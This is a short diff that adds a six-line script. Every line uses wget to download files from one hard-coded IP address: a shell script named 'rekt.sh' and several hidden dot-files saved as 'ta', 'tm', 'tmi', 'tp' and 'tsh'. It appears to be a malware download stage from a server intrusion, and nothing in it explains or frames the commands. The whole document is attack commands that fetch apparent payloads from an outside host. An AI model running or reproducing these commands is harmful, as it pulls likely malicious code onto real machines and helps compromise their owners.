@@ -1,0 +1,6 @@
+wget http://45.55.25.133/rekt.sh
+wget http://45.55.25.133/.ta -O ta
+wget http://45.55.25.133/.tm -O tm
+wget http://45.55.25.133/.tmi -O tmi
+wget http://45.55.25.133/.tp -O tp
+wget http://45.55.25.133/.tsh -O tsh
